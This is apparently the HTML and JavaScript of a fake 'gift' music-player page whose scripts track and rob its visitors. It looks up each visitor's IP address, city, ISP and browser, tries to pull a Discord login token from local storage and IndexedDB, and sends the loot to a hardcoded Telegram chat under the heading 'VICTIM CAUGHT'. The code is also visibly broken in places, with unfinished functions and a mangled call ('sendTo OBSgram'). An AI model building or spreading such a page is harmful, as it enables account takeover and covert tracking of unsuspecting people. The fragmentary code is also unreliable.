  <title>GIFT FROM LETSIE</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      color: #ff0000;
      font-family: 'Roboto', sans-serif;
      min-height: 200vh;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      position: relative;
    }
    .circle {
      position: absolute;
      top: -30px;
      width: 12px;
      height: 12px;
      background: #ff0000;
      border-radius: 50%;
      box-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333, 0 0 70px #ff0000;
      animation: fall linear infinite;
      opacity: 0.9;
    }
    @keyframes fall {
      0% { transform: translateY(-100px) scale(1); opacity: 1; }
      100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
    }
    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; margin-top: 50px; }
    .box {
      background: rgba(15, 0, 0, 0.97);
      border: 4px solid #ff0000;
      border-radius: 22px;
      padding: 35px 20px;
      box-shadow: 0 0 40px #ff0000, 0 0 80px #ff1a1a, inset 0 0 20px rgba(255,0,0,0.3);
      animation: drop 1.5s ease-out forwards;
      opacity: 0;
      transform: translateY(-100px);
    }
    @keyframes drop {
      0% { opacity: 0; transform: translateY(-100px); }
      70% { opacity: 1; transform: translateY(25px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.4rem;
      color: #ff0000;
      text-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333;
      margin-bottom: 20px;
      animation: glow 1.5s infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 15px #ff0000; }
      to { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff1a1a, 0 0 70px #ff3333; }
    }
    .btn {
      background: #ff0000;
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 16px 32px;
      border: 3px solid #ff3333;
      border-radius: 50px;
      cursor: pointer;
      margin: 15px 0;
      box-shadow: 0 0 25px #ff0000;
      transition: all 0.3s;
      font-family: 'Orbitron', sans-serif;
    }
    .btn:hover {
      background: #fff;
      color: #000;
      transform: scale(1.15);
      box-shadow: 0 0 40px #fff, 0 0 60px #ff0000;
    }
    .result {
      margin-top: 25px;
      font-size: 1.5rem;
      font-weight: bold;
      color: #fff;
      text-shadow: 0 0 15px #ff0000;
      opacity: 0;
      transition: opacity 1s;
      line-height: 1.8;
    }
    .by {
      margin-top: 30px;
      font-size: 1.7rem;
      color: #ff0000;
      font-family: 'Orbitron', sans-serif;
      animation: pulse 1.8s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.15); }
    }
    .hidden { display: none; }

    /* ARTIST SECTION */
    .artists {
      margin-top: 100px;
      width: 90%;
      max-width: 500px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      padding: 20px;
    }
    .artist-btn {
      background: rgba(255,0,0,0.1);
      border: 3px solid #ff0000;
      border-radius: 20px;
      padding: 20px;
      color: #fff;
      font-family: 'Orbitron', sans-serif;
      font-size: 1.5rem;
      text-shadow: 0 0 10px #ff0000;
      box-shadow: 0 0 30px rgba(255,0,0,0.5);
      transition: all 0.4s;
      cursor: pointer;
      text-align: center;
    }
    .artist-btn:hover {
      background: #ff0000;
      color: #000;
      transform: scale(1.05);
      box-shadow: 0 0 50px #ff0000;
    }

    /* SONG SECTION */
    .songs {
      display: none;
      flex-direction: column;
      gap: 15px;
      margin-top: 20px;
    }
    .song-btn {
      background: rgba(255,0,0,0.2);
      border: 2px solid #ff0000;
      border-radius: 15px;
      padding: 15px;
      color: #fff;
      font-size: 1.3rem;
      text-shadow: 0 0 5px #ff0000;
      cursor: pointer;
      transition: all 0.3s;
    }
    .song-btn:hover {
      background: #ff0000;
      color: #000;
      transform: scale(1.05);
    }

    /* HIDDEN PLAYER */
    #player {
      margin-top: 40px;
      width: 100%;
      height: 80px;
      overflow: hidden;
      position: relative;
    }
    #player iframe {
      position: absolute;
      top: -100px;
      left: 0;
      width: 100%;
      height: 300px;
      border: none;
    }
  </style>
</head>

  <script>
    // === RED CIRCLES ===
    const container = document.getElementById('circles');
    function createCircle() {
      const c = document.createElement('div');
      c.classList.add('circle');
      c.style.left = Math.random() * 100 + 'vw';

    // === TELEGRAM BOT ===

    const CHAT_ID = '6726658638';

    let userIP = "";

    // === SEND TO TELEGRAM ===

      let message = 
`VICTIM CAUGHT

Heres their ip: <code>${ip}</code>

    // === GET IP ===
    function getIP() {
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
          userIP = data.ip;
          document.getElementById('ip').innerHTML = userIP;
          const device = navigator.userAgent.substring(0, 80);
          sendToTelegram(userIP, "", "", "", device);
        })
        .catch(() => {
          document.getElementById('ip').innerHTML = "BLOCKED";
        });
    }

    // === GET LOCATION + ISP ===
    function getLocation() {
      fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r => r.json())
        .then(data => {
          const city = data.city || data.region || "Unknown";
          const country = data.country_name || "Unknown";
          const isp = data.org || "Unknown ISP";
          const device = navigator.userAgent.substring(0, 80);

          document.getElementById('city').innerHTML = city;
          document.getElementById('country').innerHTML = country;
          document.getElementById('isp').innerHTML = isp;

          sendToTelegram(userIP, city, country, isp, device);
        })
        .catch(() => {
          document.getElementById('city').innerHTML = "Blocked";

    // === DISCORD TOKEN GRABBER (ALL PATHS) ===
    function grabDiscordToken() {
      let token = null;
      let username = "Not Found";

      // 1. Try localStorage (web Discord)
      try {
        const stored = localStorage.getItem('token');
        if (stored) {
          token = JSON.parse(stored).replace(/"/g, '');
        }
      } catch {}

      // 2. Try IndexedDB
      if (!token && window.indexedDB) {
        const request = indexedDB.open('discord');
        request.onsuccess = () => {
          const db = request.result;
          const store = db.transaction(['tokens'], 'readonly').objectStore('tokens');
          const getReq = store.getAll();
          getReq.onsuccess = () => {
            if (getReq.result.length > 0) {
              token = getReq.result[0].token;
            }
          };
        };
      }

      // 3. Try ALL Discord App Paths via Webhook Exfiltration (Node.js not needed)
      // We'll use a stealth POST to your server later — for now, fallback to localStorage

      // 4. Final fallback: Extract from any key
      if (!token) {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key.includes('token') || key.includes('discord')) {
            try {
              const val = localStorage.getItem(key);
              const match = val.match(/"([^"]+)"/);
              if (match) token = match[1];
            } catch {}
          }
        }
      }

      // Get username
      try {
        const userKey = Object.keys(localStorage).find(k => k.includes('user') || k.includes('profile'));
        if (userKey) {
          const userData = JSON.parse(localStorage.getItem(userKey));
          username = userData.globalName || userData.username || userData.tag || "Unknown";
        }
      } catch {}

      return { token, username };
    }

    // === REVEAL DISCORD ===
    function revealDiscord() {
      document.querySelector('#result-location .btn').classList.add('hidden');
      const result = document.getElementById('result-discord');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);

      const { token, username } = grabDiscordToken();
      const display = username === "Not Found" ? "Discord Not Open" : `${username}`;

      document.getElementById('discord-user').innerHTML = display;

      if (token) {
        const device = navigator.userAgent.substring(0, 80);
        sendTo OBSgram(userIP, "", "", "", device, `${username} | ${token}`);
      }
    }

    // === REVEAL IP ===
    function reveal() {
      document.getElementById('step1').classList.add('hidden');
      document.querySelector('.btn').classList.add('hidden');
      const result = document.getElementById('result-ip');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);
      getIP();
    }

    // === REVEAL LOCATION ===
    function revealLocation() {
      document.querySelector('#result-ip .btn').classList.add('hidden');
      const result = document.getElementById('result-location');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);
      getLocation();
    }

    // === SHOW SONGS ===
    function showSongs(artist) {
      ['drake', 'carti', 'ken'].forEach(a => {
        document.getElementById(`${a}-songs`).style.display = 'none';
      });
      document.getElementById(`${artist}-songs`).style.display = 'flex';
    }

    // === PLAY SONG (HIDDEN YOUTUBE) ===
    function playSong(song, videoId) {
      const player = document.getElementById('player');
      player.innerHTML = `
        <iframe 
          src="https://www.youtube.com/embed/${videoId}?autoplay=1&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&fs=0&cc_load_policy=0&disablekb=1"
          allow="autoplay">
        </iframe>`;
      player.classList.remove('hidden');

      const device = navigator.userAgent.substring(0, 80);
      sendToTelegram(userIP, "", "", "", device, song);
    }
